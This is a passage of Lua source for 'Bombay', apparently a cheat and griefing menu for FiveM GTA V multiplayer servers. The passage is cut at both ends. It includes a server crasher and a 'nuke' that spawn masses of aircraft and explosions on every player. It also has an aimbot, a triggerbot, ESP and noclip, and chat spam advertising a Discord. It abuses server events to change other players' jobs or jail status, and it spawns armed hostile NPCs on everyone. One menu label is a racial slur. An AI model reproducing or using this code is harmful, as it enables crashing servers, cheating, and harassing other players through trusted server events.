                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
            end
			
			if chatspam then
                TriggerServerEvent(
                    '_chat:messageEntered',
                    'Bombay',
                    {0, 0x99, 255},
                    '/ooc ^1Bombay Menu get at https://discord.gg/u9CxU33'
                )
                TriggerServerEvent('_chat:messageEntered', 'Bombay', {0, 0x99, 255}, 'Bombay Menu ;) https://discord.gg/u9CxU33')
            end
			
			if servercrasher then
				Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dn))
                        end
                        for i = 0, 128 do
                            for ak = 100, 150 do
                                local dl =
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true)
                            end
                        end
                    end
                )
            end

			if nuke then
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dn))
                        end
                        --[[for bD = 5, 5 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^1Admin',
                                {
                                    0,
                                    0,
                                    0
                                },
                                '^' .. bD .. '^1Bombay ^4made by Sid ^1Official Discord: https://discord.gg/u9CxU33? ~ https://discord.gg/u9CxU33'
                            )
                        end]]
                        for i = 0, 128 do
                            local dl =
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                        end
                    end
                )
			end
			
			if crosshair5 then
                ShowHudComponentThisFrame(14)
            end
			
			if crosshair2 then
                bz('~r~+', 0.495, 0.484)
            end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 118) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 109) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if TriggerBot then
				local dp, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
                if dp then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end

			if AimBot then
				if IsPlayerFreeAiming(PlayerId()) then
                    local TargetPed = getEntity(PlayerId())
                    local TargetPos = GetEntityCoords(TargetPed)
                    local Exist = DoesEntityExist(TargetPed)
                    local Dead = IsPlayerDead(TargetPed)

                    if Exist and not Dead and IsEntityAPed(TargetPed) then
                        local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                        if IsEntityVisible(TargetPed) and OnScreen then
                            if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 100000) then
                                local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                            end
                        end
                    end
                end
            end
			
			if speedmit == true then
                while speedmit do
                    local time = 1
                    Citizen.Wait(5)
                    local s = tonumber(GetEntitySpeed(GetVehiclePedIsIn(GetPlayerPed(-1)))) - 1
                    if IsPedInAnyVehicle(GetPlayerPed(-1), false) == 1 then
                        if s <= 0.3 then
                            SetVehicleOnGroundProperly(GetVehiclePedIsUsing(GetPlayerPed(-1), false))
                            print('measure worked')
                        end
                    else
                        time = 0
                        drawNotification('~h~Hidden Speed Caution Measures Disabled')
                        speedmit = false
                    end
                end
            end
			
			if asshat then
                local speed = GetEntitySpeed(GetPlayerPed(-1))
                local v = GetVehiclePedIsIn(GetPlayerPed(-1), false)
                if not IsEntityDead(assped) then
                    Citizen.Wait(200)
                TaskVehicleEscort(assped, v, asstarget, -1, speed, 8388636, 150, 0, 30)
                else
                    asshat = false
                end
            end

            if PedGuardPlayer then
                while PedGuardPlayer do
                    Citizen.Wait(140)
                    local i = 1 
                    local entity = getEntity(PlayerId())
                    if IsPedInAnyVehicle(entity) then
                                        TaskDriveBy(
                                        pedlist[i],
                                        entity,
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        pedlist[i],
                                        entity,
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(pedlist[i], entity, 0, 0)
                                    TaskCombatPed(pedlist[i], entity, 0, 16)
                                elseif not IsPedInAnyVehicle(entity) then
                                    makePedHostile(pedlist[i], entity, 0, 0)
                                    TaskCombatPed(pedlist[i], entity, 0, 16)
                                elseif i == #pedlist then
                                    i = 1
                                end
                            end
                        end

			DisplayRadar(true)

			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end
			
			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local newPos = GetEntityCoords(entity)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local yoff = 0.0
				local zoff = 0.0

				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end

				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)

				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)

function GetPlayers()
	local players = {}

	for i = 0, 128 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end

	return players
end

local buyerserial = "Bleed"

--[[Citizen.CreateThread(
	function()
		local blips = {}
		local currentPlayer = PlayerId()

		while true do
			Wait(100)

			local players = GetPlayers()

			for player = 0, 64 do
				if player ~= currentPlayer and NetworkIsPlayerActive(player) then
					local playerPed = GetPlayerPed(player)
					local playerName = GetPlayerName(player)

					RemoveBlip(blips[player])

					local new_blip = AddBlipForEntity(playerPed)

					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

					SetBlipSprite(new_blip, 1)

					-- Enable text on blip
					SetBlipCategory(new_blip, 2)

					-- Add player name to blip
					SetBlipNameToPlayerName(new_blip, player)
					--SetBlipNameToPlayerName( blip, id ) -- update blip name

					SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
					-- Make blip white
					--SetBlipColour(new_blip, player )

					-- Set the blip to shrink when not on the minimap
					-- Citizen.InvokeNative(0x2B6D467DAB714E8D, new_blip, true)

					-- Shrink player blips slightly
					SetBlipScale(new_blip, 1.2)

					-- Add nametags above head
					Citizen.InvokeNative(0xBFEFE3321A3F5015, playerPed, playerName, false, false, "", false)

					-- Record blip so we don't keep recreating it
					blips[player] = new_blip
				end
			end
		end
	end
)]]--
function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1


		SidMenu.CreateMenu("MainMenu", "~w~Bombay")
		SidMenu.SetSubTitle("MainMenu", "~w~Bombay by Sid#7841") 
		SidMenu.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		SidMenu.CreateSubMenu("EspMenu", "MainMenu", "Esp Menu")
		SidMenu.CreateSubMenu("Destroyer", "MainMenu", "Destroyer")
		SidMenu.CreateSubMenu("VehicleMenu", "MainMenu", "Vehicle Menu")
		SidMenu.CreateSubMenu("ServerMenu", "MainMenu", "LUA Menu")
		SidMenu.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		SidMenu.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		SidMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		SidMenu.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		SidMenu.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
		SidMenu.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Menu")
		SidMenu.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		SidMenu.CreateSubMenu("CustomOptions", "ServerMenu", "Custom Options")
		SidMenu.CreateSubMenu("ESXMoney", "ServerMenu", "ESX Money Options")
		SidMenu.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		SidMenu.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		SidMenu.CreateSubMenu("NiggasOptions", "ServerMenu", "Niggas Options")
		SidMenu.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		SidMenu.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost ~b~>~s~')
		SidMenu.CreateSubMenu('PowerBoostMenu', 'BoostMenu', 'Power Boost ~b~>~s~')
		SidMenu.CreateSubMenu('TorqueBoostMenu', 'BoostMenu', 'Torque Boost ~b~>~s~')
		SidMenu.CreateSubMenu("AI", "MainMenu", "AI Menu")
		SidMenu.CreateSubMenu('Cred', 'MainMenu', 'Master Mind')
		 

		local SelectedPlayer

		while Enabled do
			if SidMenu.IsMenuOpened("MainMenu") then
				drawNotification("~y~Welcome,~b~ "..GetPlayerName(PlayerId()).."")
				drawNotification("~w~~y~Bombay made by ~b~Sid#7841")
				drawNotification("~y~Discord: ~b~https://discord.gg/u9CxU33")
				if SidMenu.MenuButton("~w~Player ~w~Menu  ", "SelfMenu") then
				elseif SidMenu.MenuButton("~w~Online Players  ", "OnlinePlayerMenu") then
				elseif SidMenu.MenuButton("~w~AI ~w~Menu  ", "AI") then
				elseif SidMenu.MenuButton("~w~ESP ~w~Menu  ", "EspMenu") then
				elseif SidMenu.MenuButton("~w~Teleport ~w~Menu  ", "TeleportMenu") then
				elseif SidMenu.MenuButton("~w~Vehicle ~w~Menu  ", "VehicleMenu") then
				elseif SidMenu.MenuButton("~w~Weapon ~w~Menu  ", "WeaponMenu") then
				elseif SidMenu.MenuButton("~r~Destroy ~w~Menu  ", "Destroyer") then
				elseif SidMenu.MenuButton("~g~Lua ~w~Menu  ", "ServerMenu") then
				elseif SidMenu.MenuButton("~y~Credits ", "Cred") then
				elseif SidMenu.Button("~h~~r~Unload Menu" ) then
					Enabled = false
				end

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("SelfMenu") then
				if
					SidMenu.CheckBox(
						"~r~God Mode",
						Godmode,
						function(enabled)
						Godmode = enabled
						end
					)
				then
				elseif SidMenu.CheckBox("~w~Infinite ~y~Stamina",InfStamina,function(enabled)InfStamina = enabled end) then
				elseif SidMenu.Button("~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif SidMenu.Button("~w~Revive ~g~ESX") then
					TriggerEvent("esx_ambulancejob:revive")
				elseif SidMenu.Button("~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif SidMenu.Button("~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif SidMenu.Button("~y~Set ~w~Hunger/Thirst to ~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif SidMenu.Button("~w~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif SidMenu.Button("~g~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
				elseif
				SidMenu.CheckBox(
					"~w~Super Jump",
					SuperJump,
						function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				SidMenu.CheckBox(
					"~w~Fast Run",
					fastrun,
					function(enabled)
						fastrun = enabled
					end)
				then
				elseif
				SidMenu.CheckBox(
					"~w~Explosive Punch",
					ePunch,
					function(enabled)
					ePunch = enabled
					end)
				then
				elseif
				 SidMenu.CheckBox(
					"~w~Speed Car",
					SpeedCar,
					function(enabled)
					SpeedCar = enabled
					end) 
			 	then
				elseif
				SidMenu.CheckBox(
					"~w~Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				SidMenu.CheckBox("~w~NoClip",
					Noclip,
					function(enabled)
					Noclip = enabled 
					end)
				then	
				end

		SidMenu.Display()
                elseif SidMenu.IsMenuOpened("AI") then
			                if SidMenu.Button("~w~Configure AI ~g~Speed") then
                    local cspeed = KeyboardInput("Enter Speed", "", 100)
					local c1 = 1.0
					cspeed = tonumber(cspeed)
					if cspeed == nil then
											drawNotification(
                            '~h~~r~Invalid Speed~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    elseif cspeed then
                        aispeed = (cspeed .. ".0")
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
                    end
					
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif SidMenu.Button("~w~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif SidMenu.Button("~w~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif SidMenu.Button("~w~AI Drive (Wander)") then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print("Configured speed is currently " .. aispeed)
                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
                elseif SidMenu.Button("~w~Stop AI") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
				end
				
		SidMenu.Display()
			elseif SidMenu.IsMenuOpened("TeleportMenu") then
				if SidMenu.Button("~w~Teleport ~g~Waypoint") then
				TeleportToWaypoint()
			elseif SidMenu.Button("~w~Teleport to ~g~Vehicle") then
				teleportToNearestVehicle()
			elseif SidMenu.Button('Draw custom ~r~blip on map') then
                    bX()
			 end

		SidMenu.Display()
			elseif SidMenu.IsMenuOpened("EspMenu") then
			if
				SidMenu.CheckBox(
				"~w~ESP",
				esp,
				function(enabled)
				esp = enabled
				end)
			then
			elseif
				SidMenu.CheckBox(
				"~w~Players Blips Map",
				playerBlips,
				function(enabled)
				playerBlips = enabled
				end)
			then
			elseif 
				SidMenu.CheckBox(
                "Original crosshair",
                crosshair5,
                function(enabled)
                crosshair5 = enabled
                end)
			then
			elseif
				SidMenu.CheckBox(
				"~r~AimBot",
				AimBot,
				function(enabled)
				AimBot = enabled
				end)	
			then
			elseif
				SidMenu.CheckBox(
				"~r~Triggerbot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
			then
			end

		SidMenu.Display()
		elseif SidMenu.IsMenuOpened("Destroyer") then
		if SidMenu.Button("Swat with AK47 On Everyone") then
			local swat = "s_m_y_swat_01"
			local bR = "weapon_assaultrifle"
			for i = 0, 128 do
				local coo = GetEntityCoords(GetPlayerPed(i))
				RequestModel(GetHashKey(swat))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(swat)) then
					local ped =
						CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
						CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
						CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
						CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
					NetworkRegisterEntityAsNetworked(ped)
					if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
						local ei = PedToNet(ped)
						NetworkSetNetworkIdDynamic(ei, false)
						SetNetworkIdCanMigrate(ei, true)
						SetNetworkIdExistsOnAllMachines(ei, true)
						GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
						SetPedCanSwitchWeapon(ped, true)
						NetToPed(ei)
						TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
					elseif IsEntityDead(GetPlayerPed(i)) then
						TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
					else
						Citizen.Wait(0)
					end
				end
			end

		elseif SidMenu.Button("Spawn Dealer with knife On Everyone") then
				local dealer = "s_m_y_dealer_01"
				local bR = "weapon_knife"
				for i = 0, 128 do
					local coo = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(dealer))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(dealer)) then
						local ped =
							CreatePed(21, GetHashKey(dealer), coo.x - 1, coo.y, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(dealer), coo.x + 1, coo.y, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(dealer), coo.x, coo.y - 1, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(dealer), coo.x, coo.y + 1, coo.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local ei = PedToNet(ped)
							NetworkSetNetworkIdDynamic(ei, false)
							SetNetworkIdCanMigrate(ei, true)
							SetNetworkIdExistsOnAllMachines(ei, true)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							NetToPed(ei)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
		elseif SidMenu.Button("Spawn Robber with Pistol On Everyone") then
				local dealer = "s_m_y_robber_01"
				local bR = "weapon_pistol"
				for i = 0, 128 do
					local coo = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(dealer))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(dealer)) then
						local ped =
							CreatePed(21, GetHashKey(dealer), coo.x - 1, coo.y, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(dealer), coo.x + 1, coo.y, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(dealer), coo.x, coo.y - 1, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(dealer), coo.x, coo.y + 1, coo.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local ei = PedToNet(ped)
							NetworkSetNetworkIdDynamic(ei, false)
							SetNetworkIdCanMigrate(ei, true)
							SetNetworkIdExistsOnAllMachines(ei, true)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							NetToPed(ei)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
		elseif SidMenu.Button("Spawn Prisoner with Knuckle On Everyone") then
				local prisoner = "s_m_y_prisoner_01"
				local bR = "weapon_KNUCKLE"
				for i = 0, 128 do
					local coo = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(prisoner))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(prisoner)) then
						local ped =
							CreatePed(21, GetHashKey(prisoner), coo.x - 1, coo.y, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(prisoner), coo.x + 1, coo.y, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(prisoner), coo.x, coo.y - 1, coo.z, 0, true, true)
							CreatePed(21, GetHashKey(prisoner), coo.x, coo.y + 1, coo.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local ei = PedToNet(ped)
							NetworkSetNetworkIdDynamic(ei, false)
							SetNetworkIdCanMigrate(ei, true)
							SetNetworkIdExistsOnAllMachines(ei, true)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							NetToPed(ei)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end

		elseif SidMenu.Button("Spawn Dog On Everyone") then
			local chop = "a_c_chop"
			for i = 0, 128 do
				local co = GetEntityCoords(GetPlayerPed(i))
				RequestModel(GetHashKey(chop))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(chop)) then
					local ped =
						CreatePed(21, GetHashKey(chop), co.x, co.y, co.z, 0, true, true)
					NetworkRegisterEntityAsNetworked(ped)
					if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
						local ei = PedToNet(ped)
						NetworkSetNetworkIdDynamic(ei, false)
						SetNetworkIdCanMigrate(ei, true)
						SetNetworkIdExistsOnAllMachines(ei, true)
						Citizen.Wait(50)
						NetToPed(ei)
						TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
					elseif IsEntityDead(GetPlayerPed(i)) then
						TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
					else
						Citizen.Wait(0)
					end
				end
			end
		
		elseif SidMenu.Button("Spawn Chimp On Everyone") then
			local chop = "a_c_chimp"
			for i = 0, 128 do
				local co = GetEntityCoords(GetPlayerPed(i))
				RequestModel(GetHashKey(chop))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(chop)) then
					local ped =
						CreatePed(21, GetHashKey(chop), co.x, co.y, co.z, 0, true, true)
					NetworkRegisterEntityAsNetworked(ped)
					if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
						local ei = PedToNet(ped)
						NetworkSetNetworkIdDynamic(ei, false)
						SetNetworkIdCanMigrate(ei, true)
						SetNetworkIdExistsOnAllMachines(ei, true)
						Citizen.Wait(50)
						NetToPed(ei)
						TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
